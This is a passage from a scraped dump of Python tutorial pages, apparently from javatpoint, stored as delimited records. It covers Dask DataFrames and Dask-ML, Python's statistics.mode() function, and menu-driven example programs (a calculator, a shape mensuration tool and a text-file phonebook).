NumPy|||Dataframes: Parallel Pandas|||Machine Learning: Parallel Scikit-Learn||||||Larger-than-memory: Dask Arrays let us work on datasets more enormous than the size of available memory. Dask helps break down the array into many minor fragments, functioning on those fragments to decrease the memory footprint of the computation and effectively streaming data from disk.|||Parallel: Dask Arrays utilize all the cores for parallel computation.|||Blocked Algorithms: Dask Arrays also provides blocked algorithms in order to operate on blocks or submatrices rather than running on entire rows or columns of an array. This function helps in performing large computations by working on many minor calculations.|||']"
179,['Dask Python (Part 2)'],"['In the previous tutorial, we have understood the concept of Distributed Computing and Introduction to Dask. We have also understood what Dask Cluster is and how to install Dask in addition to the introduction to the Dask Interface.']","['https://www.javatpoint.com/menu-driven-programs-in-python', 'https://www.javatpoint.com/mode-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/machine-learning', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/dask-python', 'https://www.javatpoint.com/menu-driven-programs-in-python', 'https://www.javatpoint.com/mode-in-python', 'https://www.javatpoint.com/menu-driven-programs-in-python']","['https://static.javatpoint.com/python/images/dask-python-part-2.png', 'https://static.javatpoint.com/python/images/dask-python-part-2-2.png', 'https://static.javatpoint.com/python/images/dask-python-part-2-3.png', 'https://static.javatpoint.com/python/images/dask-python-part-2-4.png', 'https://static.javatpoint.com/python/images/dask-python-part-2-5.png']",[],"['Dask DataFrames', 'Dask Machine Learning', 'Machine Learning Models', 'Dask-Search CV']","['Dask Interface', 'Difference between Spark and Dask']",[],"['We have already covered Dask Array in the previous tutorial; let us head straight into Dask DataFrames.', 'Here is an image is shown below representing the Dask DataFrame Structure:', 'The Dask DataFrames also provides Application Programming Interfaces (APIs) that are pretty identical to Pandas DataFrames offers.', 'Now, let us consider some examples performing the essential functions with Dask DataFrames.', 'Example 1: Reading a CSV file', 'Reading the file with the help of Pandas', 'Reading the file with the help of Pandas', 'Explanation:', 'Example 2: Finding the value count for a specific column', 'Explanation:', 'Example 3: Using the groupby function on the Dask dataframe', 'Explanation:', 'Now, let us understand another Dask Interface that is Dask Machine Learning.', 'The Central Task Scheduler sends the work in the form of python functions to the workers to execute either on the same system or on a cluster one.', 'Installation using conda', 'Installation using pip', 'Let us move onto understanding Parallelizing Scikit-Learn directly and reimplementing Algorithms using Dask Array.', '1. Parallelizing Scikit-Learn Directly', '2. Reimplementing Algorithms using the Dask Array', 'A. Linear model example', 'B. Pre-processing example', 'C. Clustering example', 'Now, let us set the values for these parameters below:', 'First Parameter - Bootstrap = True', 'Second Parameter - max_depth - [8, 9]', 'Third Parameter - n_estimators : [50, 100 , 200]', 'Installing Dask-Search CV using conda', 'Installing Dask-Search CV using pip', 'Here is the graph shown below that demonstrates the working of Dask-Search CV:', 'Here is a key difference between Spark and Dask:']","['As we have already discussed, Dask Interfaces have a variety of parallel algorithm set for distributed computation. Few essential user interfaces are being used by Data Science Practitioners to scale NumPy, Pandas, and scikit-learn:', 'The result of both the programs will be the same but differ in the processing time. Dask DataFrames deliver faster speed to execute the function when compared with Pandas. The same can be noticeable once practically used.', 'However, we can scale the parallel computation perform with the help of the scikit-learn library to multiple machines. Whereas, Dask performs well on a solitary system as well as can easily be scaled up to a cluster of systems.', 'Dask provides a central task scheduler and a group of workers. The scheduler assigns the tasks to each worker. Then these workers are assigned a number of cores on which they can execute computations. The workers deliver two functions:', 'Let us consider an example demonstrating the way of conversation between a scheduler and workers (This example has been provided by a developer of Dask, namely Matthew Rocklin):', 'The above example should provide us a clear demonstration about the working of Dask. Now let us understand the models of machine learning and Dask-search CV.', 'Dask Machine Learning (also known as Dask-ML) offers scalable machine learning in Python. But before we get started, let us follow the Dask-ML installation steps given below:', 'The primary step is to import client from the distributed module of the dask library. This command will generate a local schedule and worker on the system.', 'The next step is to instantiate the joblib of the dask in the backend. We have to import the parallel_backend from the joblib of the sklearn library as shown in the following syntax:', 'Dask-ML reimplements simple Machine Learning Algorithms in order to use NumPy Arrays. NumPy arrays are replaced by the Dask using the Dask Arrays in order to achieve Scalable Algorithms. This replacement helps to implement:', 'Let us consider an example where we need to pick a random forest technique in order to fit the dataset. The model has three significant tunable parameters - First Parameter, Second Parameter, and Third Parameter, respectively.', ""2. Dask-Search CV: In contrast to Gridsearch's CV of sklearn, Dask offers a library known as Dask-Search CV. Dask-Search CV merges the steps in order to reduce repetitions. We can install the Dask-search using the step shown below:""]","['We have observed that it requires grouping multiple NumPy Arrays in order to form a Dask Array. Similarly, a Dask DataFrame contains numerous smaller Pandas DataFrames. A large DataFrame of Pandas separates row-wise in order to form multiple smaller DataFrames. These Smaller DataFrames are available on a Single System or Multiple Systems (Hence, allowing us to store Datasets that are larger compared with the memory). Every computation of the Dask DataFrames parallelizes the functions on the prevailing Pandas DataFrames.', 'In the above example, we have created two different programs. In the first program, we have imported the pandas library and use the read_csv() function to read the CSV file. In contrast, we have imported the dataframe module of the dask library and use the read_csv() function to read the CSV file.', 'In the above example, we have imported the dataframe module of the dask library and use the read_csv() function in order to read the content from the CSV file. We have then used the name of the column ""States"" followed by the value_counts() method to count the total numbers of each value present in that specific column. As a result, we got all the state\'s names present in that column with the total number of their occurrences.', 'In the above program, we have again imported the dataframe module of the dask library and used the read_csv in order to read from the specified CSV file. Then, we have used the groupby function and max() function of the dask dataframe to find the max number of cured people from each state.', 'Dask Machine Learning offers algorithms for scalable machine learning in Python, which is compatible with scikit-learn. Let us begin with understanding the way of handling the computations using scikit-learn and then have a closer look into how Dask performs these functions in a different way.', 'A user can execute parallel computing with the help of scikit-learn (on a solitary system) by placing the parameter njobs = -1. Scikit-learn utilizes Joblib in order to execute these parallel computations. Joblib is a Python library that offers support for parallelization. When we call the fit() function, based on the tasks to be executed (whether it is a hyperparameter search or fitting a model), Joblib distributes the task across the cores available.', 'As we have already discussed, Scikit-Learn (also known as sklearn) offers parallel computing (on a single CPU) with the help of Joblib. We can directly utilize Dask in order to parallelize more than one sklearn estimators by inserting a few lines of code (without even making any modifications to the current code).', 'Hyperparameter tuning is considered a significant step in building a model and can critically alter the implementation of the model. Models of Machine Learning have various hyperparameters, and it is tough to understand which parameter would perform better in a specific situation. Executing this task manually is considerably tiresome work. However, the Scikit-Learn library offers Gridsearch in order to simplify the task for hyperparameter tuning. The user must provide the parameters, and Gridsearch will offer the best combination of these parameters.', '1. sklearn Gridsearch: For every parameter combination, Scikit-learn Gridsearch will execute the tasks, sometimes ending up iterating a single task multiple time. A graph is shown below, demonstrating that this is not exactly the most effective method:']","['# reading the file using pandas', 'import pandas as pd', 'my_pdfile = pd.read_csv(""covid_19_india.csv"")', 'print(my_pdfile)', '# reading the file using dask', 'import dask.dataframe as ddf', 'my_ddfile = ddf.read_csv(""covid_19_india.csv"")', 'print(my_ddfile.compute())', 'import dask.dataframe as ddf', 'my_ddfile = ddf.read_csv(""covid_19_india.csv"")', 'print(my_ddfile.State.value_counts().compute())', 'import dask.dataframe as ddf', 'my_ddfile = ddf.read_csv(""covid_19_india.csv"")', 'print(my_ddfile.groupby(my_ddfile.State).Cured.max().compute())', 'conda install -c conda-forge dask-ml', '$ pip install dask-ml', 'from dask.distributed import Client', '# starting a local Dask client', 'my_client = Client()', 'import dask_ml.joblib', 'from sklearn.externals.joblib import parallel_backend', ""with parallel_backend('dask'):"", '# Normal scikit-learn code goes here', 'from sklearn.ensemble import RandomForestClassifier', 'my_model = RandomForestClassifier()', 'from dask_ml.linear_model import LogisticRegression', 'mymodel = LogisticRegression()', 'mymodel.fit(data, labels)', 'from dask_ml.preprocessing import OneHotEncoder', 'myencoder = OneHotEncoder(sparse=True)', 'myresult = myencoder.fit(data)', 'from dask_ml.cluster import KMeans', 'mymodel = KMeans()', 'mymodel.fit(data)', 'conda install dask-searchcv -c conda-forge', '$ pip install dask-searchcv']","['Sno      Date     Time State/UnionTerritory ConfirmedIndianNational ConfirmedForeignNational   Cured  Deaths  Confirmed', '0        1  30/01/20  6:00 PM               Kerala                       1                        0       0       0          1', '1        2  31/01/20  6:00 PM               Kerala                       1                        0       0       0          1', '2        3  01/02/20  6:00 PM               Kerala                       2                        0       0       0          2', '3        4  02/02/20  6:00 PM               Kerala                       3                        0       0       0          3', '4        5  03/02/20  6:00 PM               Kerala                       3                        0       0       0          3', '...    ...       ...      ...                  ...                     ...                      ...     ...     ...        ...', '9286  9287  09/12/20  8:00 AM            Telengana                       -                        -  266120    1480     275261', '9287  9288  09/12/20  8:00 AM              Tripura                       -                        -   32169     373      32945', '9288  9289  09/12/20  8:00 AM          Uttarakhand                       -                        -   72435    1307      79141', '9289  9290  09/12/20  8:00 AM        Uttar Pradesh                       -                        -  528832    7967     558173', '9290  9291  09/12/20  8:00 AM          West Bengal                       -                        -  475425    8820     507995', '[9291 rows x 9 columns]', 'Sno      Date     Time State/UnionTerritory ConfirmedIndianNational ConfirmedForeignNational   Cured  Deaths  Confirmed', '0        1  30/01/20  6:00 PM               Kerala                       1                        0       0       0          1', '1        2  31/01/20  6:00 PM               Kerala                       1                        0       0       0          1', '2        3  01/02/20  6:00 PM               Kerala                       2                        0       0       0          2', '3        4  02/02/20  6:00 PM               Kerala                       3                        0       0       0          3', '4        5  03/02/20  6:00 PM               Kerala                       3                        0       0       0          3', '...    ...       ...      ...                  ...                     ...                      ...     ...     ...        ...', '9286  9287  09/12/20  8:00 AM            Telengana                       -                        -  266120    1480     275261', '9287  9288  09/12/20  8:00 AM              Tripura                       -                        -   32169     373      32945', '9288  9289  09/12/20  8:00 AM          Uttarakhand                       -                        -   72435    1307      79141', '9289  9290  09/12/20  8:00 AM        Uttar Pradesh                       -                        -  528832    7967     558173', '9290  9291  09/12/20  8:00 AM          West Bengal                       -                        -  475425    8820     507995', '[9291 rows x 9 columns]', 'Kerala                                      315', 'Delhi                                       283', 'Rajasthan                                   282', 'Haryana                                     281', 'Uttar Pradesh                               281', 'Tamil Nadu                                  278', 'Ladakh                                      278', 'Jammu and Kashmir                           276', 'Karnataka                                   276', 'Punjab                                      275', 'Maharashtra                                 275', 'Andhra Pradesh                              273', 'Uttarakhand                                 270', 'Odisha                                      269', 'West Bengal                                 267', 'Puducherry                                  267', 'Chhattisgarh                                266', 'Gujarat                                     265', 'Chandigarh                                  265', 'Madhya Pradesh                              264', 'Himachal Pradesh                            264', 'Bihar                                       263', 'Manipur                                     261', 'Mizoram                                     260', 'Andaman and Nicobar Islands                 259', 'Goa                                         259', 'Assam                                       253', 'Jharkhand                                   253', 'Arunachal Pradesh                           251', 'Tripura                                     247', 'Meghalaya                                   240', 'Telengana                                   236', 'Nagaland                                    207', 'Sikkim                                      200', 'Dadra and Nagar Haveli and Daman and Diu    181', 'Cases being reassigned to states             60', 'Telangana                                    45', 'Dadar Nagar Haveli                           37', 'Unassigned                                    3', 'Telangana***                                  1', 'Maharashtra***                                1', 'Telengana***                                  1', 'Chandigarh***                                 1', 'Daman & Diu                                   1', 'Punjab***                                     1', 'Name: State, dtype: int64', 'State', 'Andaman and Nicobar Islands                    4647', 'Andhra Pradesh                               860368', 'Arunachal Pradesh                             15690', 'Assam                                        209447', 'Bihar                                        232563', 'Cases being reassigned to states                  0', 'Chandigarh                                    16981', 'Chandigarh***                                 14381', 'Chhattisgarh                                 227158', 'Dadar Nagar Haveli                                2', 'Dadra and Nagar Haveli and Daman and Diu       3330', 'Daman & Diu                                       0', 'Delhi                                        565039', 'Goa                                           46924', 'Gujarat                                      203111', 'Haryana                                      232108', 'Himachal Pradesh                              37871', 'Jammu and Kashmir                            107282', 'Jharkhand                                    107898', 'Karnataka                                    858370', 'Kerala                                       582351', 'Ladakh                                         8056', 'Madhya Pradesh                               200664', 'Maharashtra                                 1737080', 'Maharashtra***                              1581373', 'Manipur                                       23166', 'Meghalaya                                     11686', 'Mizoram                                        3772', 'Nagaland                                      10781', 'Odisha                                       316970', 'Puducherry                                    36308', 'Punjab                                       145093', 'Punjab***                                    130406', 'Rajasthan                                    260773', 'Sikkim                                         4735', 'Tamil Nadu                                   770378', 'Telangana                                     41332', 'Telangana***                                  40334', 'Telengana                                    266120', 'Telengana***                                  42909', 'Tripura                                       32169', 'Unassigned                                        0', 'Uttar Pradesh                                528832', 'Uttarakhand                                   72435', 'West Bengal                                  475425', 'Name: Cured, dtype: int64']",['S. No.|||Spark|||Dask&&&1|||Spark is written in Scala Programming Language.|||Dask is written in Python Programming Language.&&&2|||Spark offers support for R and Python.|||Dask only supports Python.&&&3|||Spark provides its own ecosystem.|||Dask is one of the components of the Python ecosystem.&&&4|||Spark offers its own Application Programming Interfaces (APIs).|||Dask reutilizes the Application Programming Interfaces (APIs) of Pandas&&&5|||Spark is easy to understand and implement for Scala and SQL users.|||Dask is normally preferred by Python Practitioners.&&&6|||Spark does not include the support for Multi-dimensional Arrays natively.|||Dask provides full support for the NumPy models for scalable Multi-dimensional Arrays.'],"['|||Arrays: Parallel NumPy|||Dataframes: Parallel Pandas|||Machine Learning: Parallel Scikit-Learn||||||Compute the assigned tasks|||Serve the results to other workers on request.||||||Worker A, please calculate x = f(1), Worker B please calculate y = g(2)|||Worker A, once the g(2) function is complete, please get y from Worker B and perform z = h(x, y)||||||Linear Models (For example, Linear Regression, Poisson Regression, Logistic Regression, etc.)|||Pre-Processing (For example, Scalers, Transforms, etc.)|||Clustering (For example, K-means, Spectral Clustering, etc.)|||']"
180,['Mode in Python'],"['In Statistics, the value which occurs more often in a provided set of data values is known as the mode. In other terms, the number or value which has a high frequency or appears repeatedly is known as the mode or the modal value. Mode is among the three measures of the Central Tendency. The other two measures are Mean and Median, respectively.']","['https://www.javatpoint.com/dask-python-part-2', 'https://www.javatpoint.com/dask-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-statistics-module', 'https://www.javatpoint.com/dask-python-part-2', 'https://www.javatpoint.com/dask-python', 'https://www.javatpoint.com/dask-python-part-2']",[],[],[],"['An Introduction to Statistics Mode', 'The mode() function in Python', 'Some Applications of mode() function']",['Note: A StatisticsError will be raised by the mode() function if the data parameter is empty.'],"['For instance -', 'Let us look at the syntax of the mode function in Python.', 'The syntax of the mode() function is shown below:', 'Parameters of the mode() function in Python', 'The parameter of the mode() function is data. It can be an iterative or sequence - for example, lists, tuples, and a lot more.', 'Return Value of the mode() function in Python', 'Let us consider some examples based on the mode() function of the Standard statistics library of Python programming language.', 'Example 1: Finding the mode of the dataset given below:', 'Explanation:', 'Example 2: Demonstrating the mode() function working on different varieties of data types.', 'Explanation:']","['The mode() function is the only function in the standard statistics library of the Python programming language which can be applied to non-numeric (nominal) data.', 'The mode() function will return a floating-point number or non-numeric (nominal) value as per the provided data in the parameter once calculated the mode of the provided data in iterators (For example, lists, tuples, and a lot more).']","['We have a set A = {4, 5, 6, 6, 7, 8, 9}. Since the digit 6 has a higher frequency, therefore the mode of set A is 6. Thus, it is easy to find the mode for a finite number of observations. A set of data values may have one modal value or multiple modal values or no mode at all. A mode of the continuous probability distribution is often said to be any value x. Its probability density function has a maximum local value, so any peak is a mode.', 'Python becomes a pretty strong programming language while dealing with Statistics and engaging with a set of a large range of data values. Python provides the statistics module with many functions to work with pretty large datasets, and the mode() function is one of them. The mode() function is used to return the robust measure of a central data point in a provided range of datasets.', 'In the above example, we have imported the statistics library and created a set as my_set. We have then estimated the mode of the given set using the statistics.mode() function and printed its value to the user. As a result, the value having the highest frequency in the set has been printed successfully.', 'In the above example, we have imported the statistics library and the fractions module. We have then created a different range of tuples to check if the mode() function works on various data types. We have created a tuple of positive integers, floating-point values, fractional numbers, negative integers, and strings. We have then used the statistics.mode() function to calculate the mode of each dataset. We have then printed these estimated values to the users.', 'The mode() function is a statistics function that is generally used in Financial Sectors in order to compare the prices and values with previous records. It also helps in calculating and predicting the probable future prices from a price distribution set. The mode() function is not utilized separately; however, along with two other measures of statistics called mean and median. These three together work as a powerful utility to reveal many aspects of the data.']","['statistics.mode(data)', '# importing the statistics library', 'import statistics', '# creating the data set', 'my_set = [10, 20, 30, 30, 40, 40, 40, 50, 50, 60]', '# estimating the mode of the given set', 'my_mode = statistics.mode( my_set)', '# printing the estimated mode to the users', 'print(""Mode of given set of data values is"", my_mode)', '# importing the statistics library', 'import statistics', '# importing the fractions module', 'from fractions import Fraction as fr', '# creating the tuple of positive integer numbers', 'data_1 = (20, 30, 30, 40, 50, 50, 50, 60, 70, 70)', '# creating the tuple of floating point values', 'data_2 = (1.2, 2.3, 2.3, 3.4, 4.5, 4.5, 4.5, 5.6, 5.6, 7.8)', '# creating the tuple of fractional numbers', 'data_3 = (fr(1,3), fr(1,5), fr(1,5), fr(2,3), fr(3,4), fr(8,9))', '# creating the tuple of negative integer numbers', 'data_4 = (-9, -8, -7, -7, -7, -6, -5, -5, -4, -2)', '# creating the tuple of strings', 'data_5 = (""apple"", ""mango"", ""mango"", ""mango"", ""banana"", ""guava"", ""guava"")', '# estimating the mode of the given datasets', 'mode_1 = statistics.mode( data_1)', 'mode_2 = statistics.mode( data_2)', 'mode_3 = statistics.mode( data_3)', 'mode_4 = statistics.mode( data_4)', 'mode_5 = statistics.mode( data_5)', '# printing the estimated modes to the users', 'print(""1. Mode of First Data set is"", mode_1)', 'print(""2. Mode of Second Data set is"", mode_2)', 'print(""3. Mode of Third Data set is"", mode_3)', 'print(""4. Mode of Forth Data set is"", mode_4)', 'print(""5. Mode of Fifth Data set is"", mode_5)']","['Mode of given set of data values is 40', '1. Mode of First Data set is 50', '2. Mode of Second Data set is 4.5', '3. Mode of Third Data set is 1/5', '4. Mode of Forth Data set is -7', '5. Mode of Fifth Data set is mango']",[],[]
181,['Menu-Driven Programs in Python'],"['Menu-Driven Program is a program that gets input from a user by showing the options list, known as the menu, from which the user chooses their option. Systems processing the Menu-Driven programs are ordinary, starting from washing machines controlled by Microprocessors to Automated Teller Machines (ATMs). Taking the ATM case, the user presses single keys to indicate the type of transaction (if the user wants a receipt with the cash, or if an account statement is needed). With many, the user presses a single key to indicate the amount of cash for withdrawal.']","['https://www.javatpoint.com/python-array-vs-list', 'https://www.javatpoint.com/dask-python-part-2', 'https://www.javatpoint.com/https://www.javatpoint.com/microprocessor-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com/python-array-vs-list', 'https://www.javatpoint.com/dask-python-part-2', 'https://www.javatpoint.com/python-array-vs-list']","['https://static.javatpoint.com/python/images/menu-driven-programs-in-python.png', 'https://static.javatpoint.com/python/images/menu-driven-programs-in-python2.png']",[],['Conclusion'],"['An Introduction to Menu-Driven Program', 'Calculate the Parameter and Area of different Shapes using functions', 'Menu-Driven Program to create a simple calculator', 'Menu-Driven Program to create a Phone Directory']",[],"[""So, let's get started."", 'Explanation:', ""Let us consider the following program's syntax:"", 'Explanation:', 'Let us implement this idea in the following program:', 'Explanation:']","['In the following tutorial, we will discover some Menu-Driven Programs written in Python. These programs will let us understand different aspects of Menu-Driven Programs along with different libraries and modules of Python Programming Language.', 'In the following Menu-Driven Program, we are going to create a Phonebook Directory using the different functions. We will add the following features to the Phonebook Directory:']","['The Menu-Driven Systems are beneficial in two ways: At first, input is taken by the single keystrokes, which reduces the chance of the system too prone to user error. Secondly, Menu-Driven Systems limits the characters range resulting in the way where the entered input becomes unambiguous. Hence, these two characteristics make the whole system pretty user-friendly.', 'In the above example, we have defined different functions printing the estimated value after calculation. These functions include the parameters and areas of circle, rectangle, and square, respectively. We have then printed the heading of the program saying: WELCOME TO A SIMPLE MENSURATION PROGRAM. Below that, we have used the infinite while loop to print the Main Menu containing different options. The program then uses the if-elif-else statements to ask the user to input the integer choosing the options. The program will also raise an exception if the inserted integer is not present in the options list. We have then created two different submenus separating the Parameter option and the Area option. We have then added few more options within these submenus describing different shapes. These options also take different integer values indicating the radius for circle, height and width for rectangle, and side for square. As a result, the menu-driven program is successfully created and is able to calculate the parameter and areas of different shapes.', 'In the following Menu-Driven Program, we are going to build a simple calculator in Python. We will use the infinite while loop and functions same as above. We will design a menu allowing the user to interact with the calculator functions such as addition, subtract, multiplication and division.', 'In the above program, we have used almost similar procedure we did in the previous program. We have defined various functions such as add, subtract, multiply, and divide. We have then used the while loop to print the menu list to the users and if-elif-else statements to return the answers that the user needed. As a result, a simple calculator is successfully created and performs some basic calculations like addition, subtraction, multiplication, and division.', 'In the above Menu-Driven Program, we have created a Phonebook Directory that can store a new contact in a text file, display the stored contacts and allow users to search an existing number too. First of all, we have created a text file to store the contact details. We have then defined various functions in order to add, show, and search different contacts. We have also created different contact detail fields such as First Name, Last Name, Mobile Number, and E-mail Address. As a result, the program is completed successfully, and the output of the same can be seen above.', 'In the above tutorial, we have understood the meaning of Menu-Driven Programming along with some examples. We have created three different programs, including the mensuration program, a simple calculator, and a phonebook directory. Apart from these three, there are many other programs that one can create.']","['# defining functions', 'def p_circle(radius):', 'para = 2 * 3.14 * radius', 'print(""Parameter of Circle:"", para)', 'def p_rectangle(height, width):', 'para = 2 * (height + width)', 'print(""Parameter of Rectangle:"", para)', 'def p_square(side):', 'para = 4 * side', 'print(""Parameter of Square:"", para)', 'def a_circle(radius):', 'area = 3.14 * radius * radius', 'print(""Area of Circle:"", area)', 'def a_rectangle(height, width):', 'area = height * width', 'print(""Area of Rectangle:"", area)', 'def a_square(side):', 'area = side * side', 'print(""Area of Square:"", area)', '# printing the starting line', 'print(""WELCOME TO A SIMPLE MENSURATION PROGRAM"")', '# creating options', 'while True:', 'print(""\\nMAIN MENU"")', 'print(""1. Calculate Parameter"")', 'print(""2. Calculate Area"")', 'print(""3. Exit"")', 'choice1 = int(input(""Enter the Choice:""))', 'if choice1 == 1:', 'print(""\\nCALCULATE PARAMETER"")', 'print(""1. Circle"")', 'print(""2. Rectangle"")', 'print(""3. Square"")', 'print(""4. Exit"")', 'choice2 = int(input(""Enter the Choice:""))', 'if choice2 == 1:', 'radius = int(input(""Enter Radius of Circle:""))', 'p_circle(radius)', '', 'elif choice2 == 2:', 'height = int(input(""Enter Height of Rectangle:""))', 'width = int(input(""Enter Width of Rectangle:""))', 'p_rectangle(height, width)', '', 'elif choice2 == 3:', 'side = int(input(""Enter Side of Square:""))', 'p_square(side)', 'elif choice2 == 4:', 'break', '', 'else:', 'print(""Oops! Incorrect Choice."")', 'elif choice1 == 2:', 'print(""\\nCALCULATE AREA"")', 'print(""1. Circle"")', 'print(""2. Rectangle"")', 'print(""3. Square"")', 'print(""4. Exit"")', 'choice3 = int(input(""Enter the Choice:""))', 'if choice3 == 1:', 'radius = int(input(""Enter Radius of Circle:""))', 'a_circle(radius)', '', 'elif choice3 == 2:', 'height = int(input(""Enter Height of Rectangle:""))', 'width = int(input(""Enter Width of Rectangle:""))', 'a_rectangle(height, width)', '', 'elif choice3 == 3:', 'side = int(input(""Enter Side of Square:""))', 'a_square(side)', 'elif choice3 == 4:', 'break', '', 'else:', 'print(""Oops! Incorrect Choice."")', 'elif choice1 == 3:', 'break', 'else:', 'print(""Oops! Incorrect Choice."")', '# defining addition function', 'def add(a, b):', 'sum = a + b', 'print(a, ""+"", b, ""="", sum)', '# defining subtraction function', 'def subtract(a, b):', 'difference = a - b', 'print(a, ""-"", b, ""="", difference)', '# defining multiplication function', 'def multiply(a, b):', 'product = a * b', 'print(a, ""x"", b, ""="", product)', '# defining division function', 'def divide(a, b):', 'division = a / b', 'print(a, ""/"", b, ""="", division)', '# printing the heading', 'print(""WELCOME TO A SIMPLE CALCULATOR"")', '# using the while loop to print menu list', 'while True:', 'print(""\\nMENU"")', 'print(""1. Sum of two Numbers"")', 'print(""2. Difference between two Numbers"")', 'print(""3. Product of two Numbers"")', 'print(""4. Division of two Numbers"")', 'print(""5. Exit"")', 'choice = int(input(""\\nEnter the Choice: ""))', '# using if-elif-else statement to pick different options', 'if choice == 1:', 'print( ""\\nADDITION\\n"")', 'a = int( input(""First Number: ""))', 'b = int( input(""Second Number: ""))', 'add(a, b)', 'elif choice == 2:', 'print( ""\\nSUBTRACTION\\n"")', 'a = int( input(""First Number: ""))', 'b = int( input(""Second Number: ""))', 'subtract(a, b)', 'elif choice == 3:', 'print( ""\\nMULTIPLICATION\\n"")', 'a = int( input(""First Number: ""))', 'b = int( input(""Second Number: ""))', 'multiply(a, b)', 'elif choice == 4:', 'print( ""\\nDIVISION\\n"")', 'a = int( input(""First Number: ""))', 'b = int( input(""Second Number: ""))', 'divide(a, b)', 'elif choice == 5:', 'break', 'else:', 'print( ""Please Provide a valid Input!"")', '# printing the heading of the program', 'print( ""WELCOME TO THE PHONEBOOK DIRECTORY"")', '# creating a .txt file to store contact details', 'filename = ""myphonebook.txt""', 'myfile = open(filename, ""a+"")', 'myfile.close', '# defining main menu', 'def main_menu():', 'print( ""\\nMAIN MENU\\n"")', 'print( ""1. Show all existing Contacts"")', 'print( ""2. Add a new Contact"")', 'print( ""3. Search the existing Contact"")', 'print( ""4. Exit"")', 'choice = input(""Enter your choice: "")', 'if choice == ""1"":', 'myfile = open(filename, ""r+"")', 'filecontents = myfile.read()', 'if len(filecontents) == 0:', 'print( ""There is no contact in the phonebook."")', 'else:', 'print(filecontents)', 'myfile.close', 'enter = input(""Press Enter to continue ..."")', 'main_menu()', 'elif choice == ""2"":', 'newcontact()', 'enter = input(""Press Enter to continue ..."")', 'main_menu()', 'elif choice == ""3"":', 'searchcontact()', 'enter = input(""Press Enter to continue ..."")', 'main_menu()', 'elif choice == ""4"":', 'print(""Thank you for using Phonebook!"")', 'else:', 'print( ""Please provide a valid input!\\n"")', 'enter = input( ""Press Enter to continue ..."")', 'main_menu()', '# defining search function', 'def searchcontact():', 'searchname = input( ""Enter First name for Searching contact record: "")', 'remname = searchname[1:]', 'firstchar = searchname[0]', 'searchname = firstchar.upper() + remname', 'myfile = open(filename, ""r+"")', 'filecontents = myfile.readlines()', 'found = False', 'for line in filecontents:', 'if searchname in line:', 'print( ""Your Required Contact Record is:"", end = "" "")', 'print( line)', 'found = True', 'break', 'if found == False:', 'print( ""The Searched Contact is not available in the Phone Book"", searchname)', '# first name', 'def input_firstname():', 'first = input( ""Enter your First Name: "")', 'remfname = first[1:]', 'firstchar = first[0]', 'return firstchar.upper() + remfname', '# last name', 'def input_lastname():', 'last = input( ""Enter your Last Name: "")', 'remlname = last[1:]', 'firstchar = last[0]', 'return firstchar.upper() + remlname', '# storing the new contact details', 'def newcontact():', 'firstname = input_firstname()', 'lastname = input_lastname()', 'phoneNum = input( ""Enter your Phone number: "")', 'emailID = input( ""Enter your E-mail Address: "")', 'contactDetails = (""["" + firstname + "" "" + lastname + "", "" + phoneNum + "", "" + emailID +  ""]\\n"")', 'myfile = open(filename, ""a"")', 'myfile.write(contactDetails)', 'print( ""The following Contact Details:\\n "" + contactDetails + ""\\nhas been stored successfully!"")', 'main_menu()']","['WELCOME TO A SIMPLE MENSURATION PROGRAM', 'MAIN MENU', '1. Calculate Parameter', '2. Calculate Area', '3. Exit', 'Enter the Choice:1', 'CALCULATE PARAMETER', '1. Circle', '2. Rectangle', '3. Square', '4. Exit', 'Enter the Choice:2', 'Enter Height of Rectangle:4', 'Enter Width of Rectangle:5', 'Parameter of Rectangle: 18', 'MAIN MENU', '1. Calculate Parameter', '2. Calculate Area', '3. Exit', 'Enter the Choice:2', 'CALCULATE AREA', '1. Circle', '2. Rectangle', '3. Square', '4. Exit', 'Enter the Choice:1', 'Enter Radius of Circle:2', 'Area of Circle: 12.56', 'MAIN MENU', '1. Calculate Parameter', '2. Calculate Area', '3. Exit', 'Enter the Choice:5', 'Oops! Incorrect Choice.', 'MAIN MENU', '1. Calculate Parameter', '2. Calculate Area', '3. Exit', 'Enter the Choice:3', 'WELCOME TO A SIMPLE CALCULATOR', 'MENU', '1. Sum of two Numbers', '2. Difference between two Numbers', '3. Product of two Numbers', '4. Division of two Numbers', '5. Exit', 'Enter the Choice: 1', 'ADDITION', 'First Number: 3', 'Second Number: 4', '3 + 4 = 7', 'MENU', '1. Sum of two Numbers', '2. Difference between two Numbers', '3. Product of two Numbers', '4. Division of two Numbers', '5. Exit', 'Enter the Choice: 2', 'SUBTRACTION', 'First Number: 6', 'Second Number: 3', '6 - 3 = 3', 'MENU', '1. Sum of two Numbers', '2. Difference between two Numbers', '3. Product of two Numbers', '4. Division of two Numbers', '5. Exit', 'Enter the Choice: 3', 'MULTIPLICATION', 'First Number: 8', 'Second Number: 2', '8 x 2 = 16', 'MENU', '1. Sum of two Numbers', '2. Difference between two Numbers', '3. Product of two Numbers', '4. Division of two Numbers', '5. Exit', 'Enter the Choice: 4', 'DIVISION', 'First Number: 10', 'Second Number: 4', '10 / 4 = 2.5', 'MENU', '1. Sum of two Numbers', '2. Difference between two Numbers', '3. Product of two Numbers', '4. Division of two Numbers', '5. Exit', 'Enter the Choice: 5', 'WELCOME TO THE PHONEBOOK DIRECTORY', 'MAIN MENU', '1. Show all existing Contacts', '2. Add a new Contact', '3. Search the existing Contact', '4. Exit', 'Enter your choice: 1', 'There is no contact in the phonebook.', 'Press Enter to continue ...', 'MAIN MENU', '1. Show all existing Contacts', '2. Add a new Contact', '3. Search the existing Contact', '4. Exit', 'Enter your choice: 2', 'Enter your First Name: Mark', 'Enter your Last Name: Henry', 'Enter your Phone number: 1234567890', 'Enter your E-mail Address: [email\xa0protected]', 'The following Contact Details:', '[Mark Henry, 1234567890, [email\xa0protected]]', 'has been stored successfully!', 'Press Enter to continue ...', 'MAIN MENU', '1. Show all existing Contacts', '2. Add a new Contact', '3. Search the existing Contact', '4. Exit', 'Enter your choice: 3', 'Enter First name for Searching contact record: Mark', 'Your Required Contact 